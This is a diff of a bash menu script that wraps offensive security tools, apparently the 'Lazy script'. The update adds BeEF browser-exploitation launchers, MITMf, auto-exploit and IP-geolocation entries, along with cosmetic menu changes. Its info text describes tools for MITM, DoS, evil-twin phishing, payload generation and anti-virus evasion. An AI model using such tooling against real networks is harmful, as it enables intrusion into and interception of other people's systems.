@@ -1,9 +1,11 @@
 #! /bin/bash
-VERSION=2.1.1
+VERSION=2.1.2
 #Number of tools with keyboard shortcut support
-HOWMANYTOOLS=44
+HOWMANYTOOLS=45
 BACKL="0"
-DONATIONS=0
+DONATIONS=1
+LATESTCHANGELOGLINES=22
+cd
 #############DEFAULTS###############
 function defaults_l
 {
@@ -25,14 +27,40 @@ function defaults_l
 	else
 		ALFA="no"
 	fi
-#setting yellow-start 
+#yellow start 
 	YS="\e[1;33m"
-#setting blue-start 
+#blue start 
 	BS="\e[0;34m"
-#setting color-end
+#color end
 	CE="\e[0m"
-#setting red-start
+#red start
 	RS="\e[1;31m"
+#black start
+	BLS="\e[0;30m"
+#dark gray start
+	DGYS="\e[1;30m"
+#light blue start
+	LBS="\e[1;34m"
+#green start
+	GNS="\e[0;32m"
+#light green start
+	LGNS="\e[1;32m"
+#cyan start
+	CYS="\e[0;36m"
+#light cyan start
+	LCYS="\e[1;36m"
+#light red start
+	DRS="\e[0;31m"
+#purple start
+	PS="\e[0;35m"
+#light purple start
+	LPS="\e[1;35m"
+#brown start
+	BRS="\e[0;33m"
+#light gray start
+	LGYS="\e[0;37m"
+#white start
+	WHS="\e[1;37m"
 #setting custom color for logo
 	if [[ -f "$LPATH"/settings/logocolor.txt ]]
 	then
@@ -50,17 +78,124 @@ function defaults_l
 	TNI=""$RS"Tool is not installed. To install it type '"$CE""$YS"install"$CE""$RS"'."$CE""
 #code to read from keyboard without return
 	READAK="read -n 1"
-#trap
-	#~ trap finish EXIT
+#default MAC when starting monitor
+	DEFMAC="00:11:22:33:44:55"
+	
+	wififb="wififb"
 }
 ##############FUNCTIONS#############
+function local_ips()
+{
+	iffile=""$LPATH"/iftemp.txt"
+	#passing an interface if any
+	LF="$1"
+	if [[ "$LF" = "" ]]
+	then
+		echo -e ""$BS"Local IPs"$CE": "
+		TEST=$(ifconfig | grep "$ETH:")
+		n=0
+		if [[ $TEST != "" ]]
+		then
+			ifconfig "$ETH" > $iffile
+			LOCALETH=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
+			cho=$(is_it_an_ip $LOCALETH)
+			if [[ "$cho" = 1 ]]
+			then
+				echo -e ""$ETH" = "$YS"$LOCALETH"$CE""
+				n=1
+			fi
+		fi
+		TEST=$(ifconfig | grep "$WLANN:")
+		if [[ $TEST != "" ]]
+		then
+			ifconfig $WLANN > $iffile
+			LOCALMA=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
+			cho=$(is_it_an_ip $LOCALMA)
+			if [[ "$cho" = 1 ]]
+			then
+				echo -e "$WLANN = "$YS"$LOCALMA"$CE""
+				n=1
+			fi
+		fi
+		TEST=$(ifconfig | grep "$WLANNM:")
+		if [[ $TEST != "" ]]
+		then
+			ifconfig $WLANNM > $iffile
+			LOCALMO=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
+			cho=$(is_it_an_ip $LOCALMO)
+			if [[ "$cho" = 1 ]]
+			then
+				echo -e "$WLANNM = "$YS"$LOCALMO"$CE""
+				n=1
+			fi
+		fi
+		if [[ "$n" = 0 ]]
+		then
+			echo -e ""$RS"No known interfaces found available"$CE""
+		fi
+		echo -e ""
+		find_gateways
+	else
+		TEST=$(ifconfig | grep "$LF:")
+		if [[ $TEST != "" ]]
+		then
+			ifconfig $LF > $iffile
+			LOCALM=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
+			cho=$(is_it_an_ip $LOCALM)
+			if [[ "$cho" = 1 ]]
+			then
+				OUTPUT="$LOCALM"
+				echo -e "$OUTPUT"
+			fi
+		fi
+	fi
+}
+function give_ip_take_zero()
+{
+	#passing an ip
+	GI1="$1"
+	GI2="$2"
+	if [[ "$GI1" = "" ]]
+	then
+		echo -e ""$RS"Error 7. No parameters passed"$CE""
+		sleep 3
+	else
+		ip1=$(echo -e "$GI1" | cut -d '.' -f1)
+		ip2=$(echo -e "$GI1" | cut -d '.' -f2)
+		ip3=$(echo -e "$GI1" | cut -d '.' -f3)
+		if [[ "$GI2" = "" ]]
+		then
+			OUTPUT=""$ip1"."$ip2"."$ip3".0"
+		else
+			OUTPUT=""$ip1"."$ip2"."$ip3"."
+		fi
+			echo "$OUTPUT"
+	fi
+}
+function is_it_an_ip()
+{
+	IIA=$1
+	IIAI=${#IIA}
+	if [[ "$IIA" = "" ]]
+	then
+		echo -e ""$RS"Error 9. No parameteres passed"
+		sleep 2
+	else
+		if [[ "$IIAI" -le 15 && "$IIAI" -ge 7 ]]
+		then
+			echo 1
+		else
+			echo 0
+		fi
+	fi
+}
 function latest_changelog
 {
 	clear
 	printf '\033]2;LATEST CHANGELOG\a'
 	echo -e ""$BS"Wellcome to version $VERSION"$CE""
 	echo -e "What is included in this update: "
-	cat "$LPATH"/Changelog | head -n 20
+	cat "$LPATH"/Changelog | head -n $LATESTCHANGELOGLINES
 	echo -e "$PAKTC"
 	$READAK
 }
@@ -126,14 +261,14 @@ function banner
 	echo -e "$COL         ██║     ██╔══██║ ███╔╝    ╚██╔╝  $CE"
 	echo -e "$COL    The  ███████╗██║  ██║███████╗   ██║  script$CE"
 	echo -e "$COL         ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   $CE"
-	echo -e ""$YS"if"$CE") Ifconfig"
+	echo -e ""$YS"if"$CE") Ifconfig           "$YS"l"$CE") Local IPs & gateways "$RS"|"$CE"  "$YS"scan"$CE") Arp-scan network"
 	if [[ "$WLANCHECKING" = "" ]]
 	then
-		echo -e ""$RS" 1"$CE") Enable "$RS"$WLANN"$CE"${SPACESN}"$RS"d1"$CE") Disable "$RS"$WLANN"$CE"${SPACESN}  "$RS"|"$CE" "$YS"start"$CE") 1 2 3"
-		echo -e ""$RS" 2"$CE") Enable "$RS"$WLANNM"$CE"${SPACESM}"$RS"d2"$CE") Disable "$RS"$WLANNM"$CE"${SPACESM}  "$RS"|"$CE"  "$YS"stop"$CE") d1 d2 d3"
+		echo -e ""$RS" 1"$CE") Enable "$RS"$WLANN"$CE"${SPACESN}"$RS"d1"$CE") Disable "$RS"$WLANN"$CE"${SPACESN}  "$RS"|"$CE" "$YS"start"$CE") Start monitor mode"
+		echo -e ""$RS" 2"$CE") Enable "$RS"$WLANNM"$CE"${SPACESM}"$RS"d2"$CE") Disable "$RS"$WLANNM"$CE"${SPACESM}  "$RS"|"$CE"  "$YS"stop"$CE") Stop monitor mode"
 	else
-		echo -e ""$YS" 1"$CE") Enable $WLANN${SPACESN}"$YS"d1"$CE") Disable $WLANN${SPACESN}  "$RS"|"$CE" "$YS"start"$CE") 1 2 3"
-		echo -e ""$YS" 2"$CE") Enable $WLANNM${SPACESM}"$YS"d2"$CE") Disable $WLANNM${SPACESM}  "$RS"|"$CE"  "$YS"stop"$CE") d1 d2 d3"
+		echo -e ""$YS" 1"$CE") Enable $WLANN${SPACESN}"$YS"d1"$CE") Disable $WLANN${SPACESN}  "$RS"|"$CE" "$YS"start"$CE") Start monitor mode"
+		echo -e ""$YS" 2"$CE") Enable $WLANNM${SPACESM}"$YS"d2"$CE") Disable $WLANNM${SPACESM}  "$RS"|"$CE"  "$YS"stop"$CE") Stop monitor mode"
 	fi
 	echo -e ""$YS" 3"$CE") Change MAC        "$YS"d3"$CE") Restore original MAC "$RS"|"$CE""$YS"update"$CE") Check for updates"
 	if [[ -f /usr/bin/anonym8 ]]
@@ -145,12 +280,12 @@ function banner
 	if [[ -f /usr/bin/anonsurf ]]
 	then
 	echo -e ""$YS" 5"$CE") Enable anonsurf   "$YS"d5"$CE") Disable anonsurf     "$RS"|"$CE"    "$YS"ks"$CE") Keyboard shortucts"
-	echo -e ""$YS" 6"$CE") Anonsurf's status "$YS"d6"$CE") Restart anonsurf    "$RS"_|"$CE""$YS"donate"$CE") Buy me a coffee"
+	echo -e ""$YS" 6"$CE") Anonsurf's status "$YS"d6"$CE") Restart anonsurf     "$RS"|"$CE""$YS"     d"$CE") Buy me a coffee"
 	else
 	echo -e ""$RS" 5"$CE") Enable anonsurf   "$RS"d5"$CE") Disable anonsurf     "$RS"|"$CE"    "$YS"ks"$CE") Keyboard shortucts"
-	echo -e ""$RS" 6"$CE") Anonsurf's status "$RS"d6"$CE") Restart anonsurf     "$RS"|"$CE""$YS"donate"$CE") Buy me a coffee"
+	echo -e ""$RS" 6"$CE") Anonsurf's status "$RS"d6"$CE") Restart anonsurf     "$RS"|"$CE"     "$YS"d"$CE") Buy me a coffee"
 	fi
-	echo -e ""$YS" 7"$CE") View Public IP                           "$RS"|"$CE""$YS"settings"$CE") Go to settings menu"
+	echo -e ""$YS" 7"$CE") View public IP                             "$RS"|"$CE"     "$YS"s"$CE") Go to settings menu"
 	echo -e ""$YS" 8"$CE") View MAC"
 	echo -e ""$YS" 9"$CE") TOOLS             "$YS"15"$CE") Spoof EMAIL"
 	if [[ -f /root/ngrok ]]
@@ -165,8 +300,8 @@ function banner
 	else
 		echo -e ""$YS"11"$CE") Find WPS pin      "$RS"17"$CE") Ask ("$RS"Howdoi"$CE" tool)"
 	fi
-	echo -e ""$YS"12"$CE") WEP hacking  "
-	echo -e ""$YS"13"$CE") MITM         "
+	echo -e ""$YS"12"$CE") WEP hacking       "$YS"18"$CE") Auto-exploit browser"
+	echo -e ""$YS"13"$CE") MITM              "$YS"19"$CE") Geolocate an IP"
 	echo -e ""$YS"14"$CE") Metasploit   "   
 	echo -e ""$YS" 0"$CE") EXIT"
 	echo "Choose: "
@@ -190,19 +325,19 @@ function interface_selection
 {
 if [[ "$WLANCHECKING" = "" ]]
 then
-	echo -e "$RS 1$CE) $WLANN"
+	echo -e ""$RS" 1"$CE") $WLANN"
 else
-	echo -e "$YS 1$CE) $WLANN"
+	echo -e ""$YS" 1"$CE") $WLANN"
 fi
 if [[ "$WLANMCHECKING" = "" ]]
 then
-	echo -e "$RS 2$CE) $WLANNM"
+	echo -e ""$RS" 2"$CE") $WLANNM"
 else
-	echo -e "$YS 2$CE) $WLANNM"
+	echo -e ""$YS" 2"$CE") $WLANNM"
 fi
-echo -e "$YS 3$CE) Eth0"
-echo -e ""$YS"00$CE) Main menu"
-echo -e "$YS 0$CE) EXIT"
+echo -e ""$YS" 3"$CE") "$ETH""
+echo -e ""$YS" b"$CE") Main menu"
+echo -e ""$YS" 0"$CE") EXIT"
 echo -e "Choose: "
 read -e MYINT
 if [[ "$MYINT" = "2" ]]
@@ -225,12 +360,12 @@ elif [[ "$MYINT" = "0" ]]
 then
 	clear
 	exit
-elif [[ "$MYINT" = "00" ]]
+elif [[ "$MYINT" = "00" || "$MYINT" = "b" ]]
 then
 	exec bash "$0"
 elif [[ "$MYINT" = "3" ]]
 then
-	MYINT="eth0"
+	MYINT="$ETH"
 else
 echo -e "Wrong choice..."
 sleep 2
@@ -273,18 +408,34 @@ function change_mac
 }
 function set_interface_number
 {
+clear
 while true
 do
-echo -e "Enter the name of your wireless interface when in "$RS"managed"$CE" mode.(e.g:"$YS"wlan0"$CE"): "
+echo -e "Enter the name of your wireless interface when in "$RS"managed"$CE" mode("$YS"Enter"$CE"=wlan0): "
 read MANAGED
-echo -e "Enter the name of your wireless interface when in "$RS"monitor"$CE" mode.(e.g:"$YS"wlan0mon"$CE"): "
+if [[ "$MANAGED" = "" ]]
+then
+	MANAGED="wlan0"
+fi
+echo -e "Enter the name of your wireless interface when in "$RS"monitor"$CE" mode("$YS"Enter"$CE"=wlan0mon): "
 read MONITOR
-	echo $MANAGED > "$LPATH"/wlan.txt
-	echo $MONITOR > "$LPATH"/wlanmon.txt
-	echo -e "Done "
+if [[ "$MONITOR" = "" ]]
+then
+	MONITOR="wlan0mon"
+fi
+echo -e "Enter the name of your wired interface("$YS"Enter"$CE"="eth0"): "
+read WIRED
+if [[ "$WIRED" = "" ]]
+then
+	WIRED="eth0"
+fi
+	echo "$MANAGED" > "$LPATH"/wlan.txt
+	echo "$MONITOR" > "$LPATH"/wlanmon.txt
+	echo "$WIRED" > "$LPATH"/eth.txt
+	echo -e ""$YS"Done"$CE""
 	sleep 1
 	clear
-	echo -e "If you want to change it, type "$YS"interface"$CE" any time"
+	echo -e ""$BS"If you want to change it, type "$CE""$YS"interface"$CE""$BS" any time"$CE""
 	sleep 3
 	echo -e "$PAKTC"
 	$READAK	
@@ -301,17 +452,17 @@ function checkifalready
 		if [[ "$CHECKKS" = "$num" ]]
 		then
 			GOOD="0"
-			echo -e "This shortcut is already in use by the script."
+			echo -e ""$RS"This shortcut is already in use by the script."$CE""
 			sleep 3
 		fi
 		num=$(( num+1 ))
 	done
 	if [[ "$GOOD" = "1" ]]
 	then
-		if [[ "$CHECKKS" = "" || "$CHECKKS" = "if" || "$CHECKKS" = "ifconfig" || "$CHECKKS" = "interfaces" || "$CHECKKS" = "interface" || "$CHECKKS" = "errors" || "$CHECKKS" = "00" || "$CHECKKS" = "exit" || "$CHECKKS" = "update" || "$CHECKKS" = "d1" || "$CHECKKS" = "d2" || "$CHECKKS" = "d3" || "$CHECKKS" = "d4" || "$CHECKKS" = "d5" || "$CHECKKS" = "d6" || "$CHECKKS" = "d7" || "$CHECKKS" = "gg" || "$CHECKKS" = "ks" ]]
+		if [[ "$CHECKKS" = "etercheck" || "$CHECKKS" = "eternalblue" || "$CHECKKS" = "changelog" || "$CHECKKS" = "wififb" || "$CHECKKS" = "nessusstop" || "$CHECKKS" = "nessusstart" || "$CHECKKS" = "pstop" || "$CHECKKS" = "pstart" || "$CHECKKS" = "astop" || "$CHECKKS" = "astart" || "$CHECKKS" = "settings" || "$CHECKKS" = "donate" || "$CHECKKS" = "d" || "$CHECKKS" = "s" || "$CHECKKS" = "g" || "$CHECKKS" = "l" || "$CHECKKS" = "" || "$CHECKKS" = "if" || "$CHECKKS" = "ifconfig" || "$CHECKKS" = "interfaces" || "$CHECKKS" = "interface" || "$CHECKKS" = "errors" || "$CHECKKS" = "00" || "$CHECKKS" = "exit" || "$CHECKKS" = "update" || "$CHECKKS" = "d1" || "$CHECKKS" = "d2" || "$CHECKKS" = "d3" || "$CHECKKS" = "d4" || "$CHECKKS" = "d5" || "$CHECKKS" = "d6" || "$CHECKKS" = "d7" || "$CHECKKS" = "gg" || "$CHECKKS" = "ks" ]]
 		then
 			GOOD="0"
-			echo -e "This shortcut is already in use by the script."
+			echo -e ""$RS"This shortcut is already in use by the script."$CE""
 			sleep 3
 		fi
 	fi
@@ -319,6 +470,10 @@ function checkifalready
 	then
 		GOOD="0"
 	fi
+	#~ if [[ "$CHECKKS" = "b" || "$CHECKKS" = "back" ]]
+	#~ then
+		#~ GOOD="0"
+	#~ fi
 	if [[ "$GOOD" = "1" ]]
 	then
 		BACKUPTITLE="$TITLE"
@@ -333,7 +488,7 @@ function checkifalready
 			read KSIFALREADY < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
 			if [[ "$CHECKKS" == "$KSIFALREADY" ]]
 			then
-				echo -e "Shortcut '"$CHECKKS"' is already in use by "$TITLE""
+				echo -e ""$RS"Shortcut '"$CHECKKS"' is already in use by "$TITLE""$CE""
 				GOOD=0
 				sleep 3
 			fi
@@ -357,44 +512,47 @@ echo -e "(e.g: "$YS""$TITLE""$CE")"
 echo -e "To delete it , type:   "$YS"delete"$CE""
 echo -e ""$YS" b"$CE") Go back"
 read CHECKKS
-if [[ "$CHECKKS" = "back" || "$CHECKS" = "b" ]]
+if [[ "$CHECKKS" = "back" || "$CHECKKS" = "b" ]]
 then
 	clear
 	BACKKS=1
+	break
 else
 	BACKKS=0
-fi
-if [[ "$BACKKS" == 0 ]]
-then
-	CHECKKSBACKUP="$CHECKKS"
-	NAMECDBACKUP="$NAMECD"
-	KSSETBACKUP="$KSSET"
-	checkifalready
-	CHECKKS="$CHECKKSBACKUP"
-	NAMECD="$NAMECDBACKUP"
-	KSSET="$KSSETBACKUP"
-	if [[ "$GOOD" = "1" ]]
+	if [[ "$BACKKS" == 0 ]]
 	then
-		echo -e "Shortcut is ok.Setting it up..."
-		sleep 1
-		echo "$CHECKKS" > "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
-		echo "$NAMECD" > "$KSPATH"/"$TITLE"/"$TITLE".txt
-		echo "$KSSET" > "$KSPATH"/"$TITLE"/"$TITLE"2.txt
-		echo -e "Done!"
-		echo -e "$PAKTGB"
-		$READAK
-		clear
-		#break
+		CHECKKSBACKUP="$CHECKKS"
+		NAMECDBACKUP="$NAMECD"
+		KSSETBACKUP="$KSSET"
+		checkifalready
+		CHECKKS="$CHECKKSBACKUP"
+		NAMECD="$NAMECDBACKUP"
+		KSSET="$KSSETBACKUP"
+		if [[ "$GOOD" = "1" ]]
+		then
+			echo -e "Shortcut is ok.Setting it up..."
+			sleep 1
+			echo "$CHECKKS" > "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
+			echo "$NAMECD" > "$KSPATH"/"$TITLE"/"$TITLE".txt
+			echo "$KSSET" > "$KSPATH"/"$TITLE"/"$TITLE"2.txt
+			echo -e "Done!"
+			echo -e "$PAKTGB"
+			$READAK
+			clear
+			#break
+		else
+			clear
+			echo -e "Removing shortcut for "$TITLE"..."
+			rm -r "$KSPATH"/"$TITLE"
+			sleep 1
+			echo -e "Done."
+			echo -e "$PAKTGB"
+			$READAK
+			clear
+			#break
+		fi
 	else
-		clear
-		echo -e "Removing shortcut for "$TITLE"..."
-		rm -r "$KSPATH"/"$TITLE"
-		sleep 1
-		echo -e "Done."
-		echo -e "$PAKTGB"
-		$READAK
-		clear
-		#break
+		break
 	fi
 fi
 }
@@ -510,7 +668,7 @@ function listshortcuts
 	then
 		TITLE="Angry_IP_Scanner"
 		NAMECD=" "
-		KSSET="gnome-terminal --geometry 1x1+9999+9999 -e /usr/bin/ipscan -s & disown"
+		KSSET="ipscan & disown"
 	#~ elif [[ "$nn" = "23" ]]
 	#~ then
 		#~ TITLE="Sniper"
@@ -626,6 +784,11 @@ function listshortcuts
 		TITLE="SecHub"
 		NAMECD=""
 		KSSET="sechub"
+	elif [[ "$nn" = "45" ]]
+	then
+		TITLE="Beef-xss"
+		NAMECD="cd /usr/share/beef-xss"
+		KSSET="./beef"
 	fi
 }
 function reinstall_tools
@@ -651,7 +814,7 @@ do
 	echo -e ""$YS"11"$CE") Fern         "$YS"31"$CE") TheFatRat     "$YS"51"$CE") Vmr mdk          "$YS"71"$CE") UniByAv"
 	echo -e ""$YS"12"$CE") Netdiscover  "$YS"32"$CE") Angry IP      "$YS"52"$CE") Hash Buster      "$YS"72"$CE") Demiguise"
 	echo -e ""$YS"13"$CE") KickThemOut  "$YS"33"$CE") Sniper        "$YS"53"$CE") Findsploit       "$YS"73"$CE") Dkmc"
-	echo -e ""$YS"14"$CE") Ghost-Phisher"$YS"34"$CE") ReconDog      "$YS"54"$CE") Howdoi"
+	echo -e ""$YS"14"$CE") Ghost-Phisher"$YS"34"$CE") ReconDog      "$YS"54"$CE") Howdoi           "$YS"74"$CE") MITMf"
 	echo -e ""$YS"15"$CE") The Eye      "$YS"35"$CE") RED HAWK      "$YS"55"$CE") Operative-frmwork"
 	echo -e ""$YS"16"$CE") Xerxes       "$YS"36"$CE") WinPayloads   "$YS"56"$CE") Netattack2"
 	echo -e ""$YS"17"$CE") Mdk3-master  "$YS"37"$CE") Shellter      "$YS"57"$CE") Koadic"
@@ -882,6 +1045,9 @@ do
 	elif [[ "$REIN" = "73" ]]
 	then
 		install_dkmc
+	elif [[ "$REIN" = "74" ]]
+	then
+		install_mitmf
 	elif [[ "$REIN" = "back" || "$REIN" = "b" ]]
 	then
 		clear
@@ -1032,91 +1198,91 @@ if [[ "$KS" = "1" ]]
 then
 	while true
 	do
-	echo -e "Available shortcuts:                        "$YS"reset"$CE") Delete all shortcuts"
-	nn=1
-	#start sorting out all the available shortcuts
-	HOWADD=$(( HOWMANYTOOLS + 1 )) 
-	while [ "$nn" != "$HOWADD" ]
-	do
-	listshortcuts
-	#adding a space where needed on the output,so it will be sorted correctly
-	if [[ "$nn" -lt "10" ]]
-	then
-		n=" $nn"
-	else
-		n="$nn"
-	fi
-	if [[ ! -f ""$KSPATH"/"$TITLE"/"$TITLE".txt" ]]
-	then
-		echo -e ""$YS""$n""$CE") "$TITLE""
-	else
-		read KSKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
-		if [[ "$KSKS" = "" ]]
+		echo -e "Available shortcuts:                        "$YS"reset"$CE") Delete all shortcuts"
+		nn=1
+		#start sorting out all the available shortcuts
+		HOWADD=$(( HOWMANYTOOLS + 1 )) 
+		while [ "$nn" != "$HOWADD" ]
+		do
+		listshortcuts
+		#adding a space where needed on the output,so it will be sorted correctly
+		if [[ "$nn" -lt "10" ]]
 		then
-			KSKS="ERROR(fix=recreate the shortcut)"
+			n=" $nn"
 		else
-			read currentks < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
-			size=${#TITLE}
-			calc=$(( 35-size ))
-			numcalc=1
-			SPACES=""
-			while [ $numcalc != $calc ]
-			do
-				SPACES=""$SPACES"_"
-				numcalc=$(( numcalc+1 ))
-			done
-			#~ read SPACES < "$KSPATH"/spaces.txt
-			echo -e ""$YS""$n""$CE") "$TITLE""$SPACES""$KSKS""
+			n="$nn"
 		fi
-	fi
-	nn=$(( nn+1 ))
-	done
-	echo -e ""$YS" b"$CE") Go back"
-	#echo -e ""$YS" 0"$CE") EXIT"
-	echo -e "Choose: "
-	#nn=""
-	read nn
-	clear
-	listshortcuts
-	if [[ "$nn" = "" ]]
+		if [[ ! -f ""$KSPATH"/"$TITLE"/"$TITLE".txt" ]]
+		then
+			echo -e ""$YS""$n""$CE") "$TITLE""
+		else
+			read KSKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
+			if [[ "$KSKS" = "" ]]
+			then
+				KSKS="ERROR(fix=recreate the shortcut)"
+			else
+				read currentks < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
+				size=${#TITLE}
+				calc=$(( 35-size ))
+				numcalc=1
+				SPACES=""
+				while [ $numcalc != $calc ]
+				do
+					SPACES=""$SPACES"_"
+					numcalc=$(( numcalc+1 ))
+				done
+				#~ read SPACES < "$KSPATH"/spaces.txt
+				echo -e ""$YS""$n""$CE") "$TITLE""$SPACES""$KSKS""
+			fi
+		fi
+		nn=$(( nn+1 ))
+		done
+		echo -e ""$YS" b"$CE") Go back"
+		#echo -e ""$YS" 0"$CE") EXIT"
+		echo -e "Choose: "
+		#nn=""
+		read nn
+		clear
+		listshortcuts
+		if [[ "$nn" = "" ]]
+		then
+			continue
+		fi
+		if [[ "$nn" = "back" || "$nn" = "b" ]]
+		then
+			clear
+			break
+		elif [[ "$nn" = "0" ]]
+		then
+			clear
+			exit
+		elif [[ "$nn" = "00" ]]
+		then
+			exec bash "$0"
+		elif [[ "$nn" = "reset" ]]
+		then
+			rm -r "$KSPATH"/*
+		elif [[ "$nn" -le "$HOWMANYTOOLS" ]]
+		then
+			createshortcut
+		fi
+		done
+	elif [[ "$KS" = "2" ]]
 	then
-		continue
-	fi
-	if [[ "$nn" = "back" || "$nn" = "b" ]]
+		hidden_shortcuts
+	elif [[ "$KS" = "back" || "$KS" = "b" ]]
 	then
+		BACKL="1"
 		clear
 		break
-	elif [[ "$nn" = "0" ]]
+	elif [[ "$KS" = "0" ]]
 	then
 		clear
 		exit
-	elif [[ "$nn" = "00" ]]
+	elif [[ "$KS" = "00" ]]
 	then
 		exec bash "$0"
-	elif [[ "$nn" = "reset" ]]
-	then
-		rm -r "$KSPATH"/*
-	elif [[ "$nn" -le "$HOWMANYTOOLS" ]]
-	then
-		createshortcut
 	fi
-	done
-elif [[ "$KS" = "2" ]]
-then
-	hidden_shortcuts
-elif [[ "$KS" = "back" || "$KS" = "b" ]]
-then
-	BACKL="1"
-	clear
-	break
-elif [[ "$KS" = "0" ]]
-then
-	clear
-	exit
-elif [[ "$KS" = "00" ]]
-then
-	exec bash "$0"
-fi
 done
 }
 function mitm_menu
@@ -1183,14 +1349,14 @@ then
 		route -n
 		echo -e ""
 		echo -e ""
-		echo -e "Enter your gateway(prefer eth0 gateway):"
+		echo -e "Enter your gateway(prefer "$ETH" gateway):"
 		read GATENM
 		echo -e ""
-		echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
+		echo -e "Enter the gateway's interface("$YS"Enter"$CE"="$ETH"):"
 		read GATEINT
 		if [[ "$GATEINT" = "" ]]
 		then
-			GATEINT="eth0"
+			GATEINT="$ETH"
 		fi	
 		while true
 		do	
@@ -1226,14 +1392,14 @@ then
 	elif [[ "$MITMCH" = "33" ]]
 	then
 		clear
-		echo -e "Enter your gateway(prefer eth0 gateway):"
+		echo -e "Enter your gateway(prefer "$ETH" gateway):"
 		read GATENM
 		echo -e ""
-		echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
+		echo -e "Enter the gateway's interface("$YS"Enter"$CE"="$ETH"):"
 		read GATEINT
 		if [[ "$GATEINT" = "" ]]
 		then
-			GATEINT="eth0"
+			GATEINT="$ETH"
 		fi
 		clear
 		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
@@ -2955,7 +3121,7 @@ function wifi_tools
 			then
 				NRANGE="192.168.1.0/24"
 			fi
-			netdiscover -r $NRANGE
+			netdiscover -r $NRANGE -i "$WLANN"
 		else
 			echo -e "$TNI"
 			read INSTALL
@@ -3589,6 +3755,12 @@ function remote_access
 		echo -e ""$YS"24"$CE") DKMC                  Malicious payload evasion tool into image"
 	else
 		echo -e ""$RS"24"$CE") "$RS"DKMC"$CE"                   Malicious payload evasion tool into image"
+	fi
+	if [[ -d /usr/share/beef-xss ]]
+	then
+		echo -e ""$YS"25"$CE") Beef                  The browser exploitation framework"
+	else
+		echo -e ""$RS"25"$CE") "$RS"Beef"$CE"                   The browser exploitation framework"
 	fi
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
@@ -4244,6 +4416,22 @@ function remote_access
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_dkmc
+			else
+				continue
+			fi
+		fi
+	elif [[ "$KEYLOG" = "25" ]]
+	then
+		if [[ -d /usr/share/beef-xss ]]
+		then
+			cd /usr/share/beef-xss
+			./beef
+		else	
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_beef
 			else
 				continue
 			fi
@@ -5062,14 +5250,14 @@ function metasploit_menu
 		echo -e ""
 		echo -e ""
 		echo -e "Enter the name of the listener you want to select(e.g: "$YS"john"$CE")"
-		echo -e ""$YS"reset"$CE") Delete all saved listeners"
-		echo -e ""$YS" back"$CE") Go back"
+		echo -e ""$YS" r"$CE") Delete all saved listeners"
+		echo -e ""$YS" b"$CE") Go back"
 		read NAMERC
 		clear
 		if [[ "$NAMERC" = "back" || "$NAMERC" = "b" ]]
 		then
 			break
-		elif [[ "$NAMERC" = "reset" ]]
+		elif [[ "$NAMERC" = "reset" || "$NAMERC" = "r" ]]
 		then
 			rm -f "$LPATH"/rc/*
 			continue
@@ -5264,6 +5452,7 @@ function hidden_shortcuts
 	echo -e ""$YS"      astop"$CE") Service apache2 stop"
 	echo -e ""$YS"nessusstart"$CE") Start Nessus"
 	echo -e ""$YS" nessusstop"$CE") Stop Nessus"
+	echo -e ""$YS"         00"$CE") Go to main menu"
 	echo -e "$PAKTGB"
 	$READAK
 	clear
@@ -5318,6 +5507,7 @@ function tools_menu
 {
 	while true
 	do
+	clear
 	TERMINALTITLE="TOOLS"
 	dash_calc
 	printf '\033]2;TOOLS\a'
@@ -5326,8 +5516,9 @@ function tools_menu
 	echo -e ""$YS" 3"$CE") Information gathering"
 	echo -e ""$YS" 4"$CE") Others"
 	echo -e ""$YS" 5"$CE") Install/reinstall a tool"
+	echo -e ""$YS" i"$CE") Info"
 	echo -e ""$YS" b"$CE") Go back"
-	echo -e ""$YS"00"$CE") Main menu"
+	#~ echo -e ""$YS"00"$CE") Main menu"
 	echo -e ""$YS" 0"$CE") EXIT"
 	echo "Choose: "
 	read -e CATEG
@@ -5351,14 +5542,35 @@ function tools_menu
 		then
 			clear
 			exit
-		elif [[ "$CATEG" = "back" || "$CATEG" = "b" ]]
+		elif [[ "$CATEG" = "back" || "$CATEG" = "b" || "$CATEG" = 00 ]]
 		then
 			BACKL="1"
 			break
-		elif [[ "$CATEG" = "00" ]]
+		elif [[ "$CATEG" = "i" ]]
 		then
-			clear
-			exec bash "$0"
+			TERMINALTITLE="INFO"
+			dash_calc
+			printf '\033]2;INFO\a'
+			echo -e ""$LGYS"Wifi tools:"
+			echo -e "	Mostly focused on network attacks, MITM, DoS, evil-twin and phishing."
+			echo -e "Remote access:"
+			echo -e "	Mostly focused on payload generation, listeners, exploits, scanners"
+			echo -e "	and bypassing anti-virus software."
+			echo -e "Information gathering:"
+			echo -e "	Self-explained."
+			echo -e "Other tools:"
+			echo -e "	Some very usefull tools that don't fit to the other categories."
+			echo -e "Install/reinstall a tool:"
+			echo -e "	From here you can install any tool available in the lazy script."
+			echo -e "	If it is already installed, it will be deleted and reistalled."$CE""
+			echo -e ""
+			echo -e ""$BS"Do you want another tool to be added in the script?"$CE""
+			echo -e ""$BS"Submit it as an issue on my github repo:"$CE""
+			echo -e "	"$YS"https://github.com/arismelachroinos/lscript"$CE""
+			echo -e ""
+			echo -e ""
+			echo -e "$PAKTGB"
+			$READAK
 		fi
 	done
 }
@@ -5478,9 +5690,15 @@ function start_menu
 	else
 		airmon-ng start $WLANN | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e ""$YS"Done"$CE"" && O2=1
 	fi
-	echo -e "Changing mac address of $WLANNM to 00:11:22:33:44:55..."
+	if [[ -f "$LPATH"/settings/startmac.txt ]]
+	then
